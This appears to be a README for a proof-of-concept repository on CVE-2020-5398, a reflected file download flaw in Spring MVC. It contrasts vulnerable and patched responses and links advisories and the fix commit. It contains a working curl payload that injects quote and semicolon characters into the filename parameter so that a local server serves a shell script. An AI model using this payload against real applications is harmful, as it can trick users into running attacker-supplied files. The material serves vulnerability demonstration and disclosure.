# CVE-2020-5398 - RFD(Reflected File Download) Attack for Spring MVC

> In Spring Framework, versions 5.2.x prior to 5.2.3, versions 5.1.x prior to 5.1.13, and versions 5.0.x prior to 5.0.16, an application is vulnerable to a reflected file download (RFD) attack when it sets a “Content-Disposition” header in the response where the filename attribute is derived from user supplied input.

## Using

1.
```
./gradlew bootrun
```

Listen on `127.0.0.1:8080`.

2.
```
$ curl 'http://127.0.0.1:8080/?filename=sample&contents=Hello,%20World' --dump-header -
HTTP/1.1 200
Content-Disposition: attachment; filename="sample.txt"
Content-Type: application/octet-stream
Content-Length: 12
Date: Fri, 17 Jan 2020 05:41:08 GMT

Hello, World
```

Start download `sample.txt` file.

## PoC

### Insecure Version(Spring Web 5.2.2)

```
curl 'http://127.0.0.1:8080/?filename=sample.sh%22%3B&contents=%23!%2Fbin%2Fbash%0Aid' --dump-header -
HTTP/1.1 200
Content-Disposition: attachment; filename="sample.sh";.txt"
Content-Type: application/octet-stream
Content-Length: 14
Date: Fri, 17 Jan 2020 05:22:18 GMT

#!/bin/bash
id
```

Start download `sample.sh` file.(Shell file)

### Secure Version(Spring Web 5.2.3)

```
$ curl 'http://127.0.0.1:8080/?filename=sample.sh%22%3B&contents=%23!%2Fbin%2Fbash%0Aid' --dump-header -
HTTP/1.1 200
Content-Disposition: attachment; filename="sample.sh\";.txt"
Content-Type: application/octet-stream
Content-Length: 14
Date: Fri, 17 Jan 2020 05:24:47 GMT

#!/bin/bash
id
```

Start download `sample.sh";.txt` file.(Text file)

## References

- [CVE-2020-5398: RFD Attack via “Content-Disposition” Header Sourced from Request Input by Spring MVC or Spring WebFlux Application | Security | Pivotal](https://pivotal.io/security/cve-2020-5398)
- [NVD - CVE-2020-5398](https://nvd.nist.gov/vuln/detail/CVE-2020-5398)
- What's RFD Attack?
  - [eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf](https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf)
  - [Reflected File Download - OWASP](https://wiki.owasp.org/index.php/Reflected_File_Download)
- Fix Commit
  - [ContentDisposition refactoring · spring-projects/spring-framework@956ffe6](https://github.com/spring-projects/spring-framework/commit/956ffe68587c8d5f21135b5ce4650af0c2dea933)
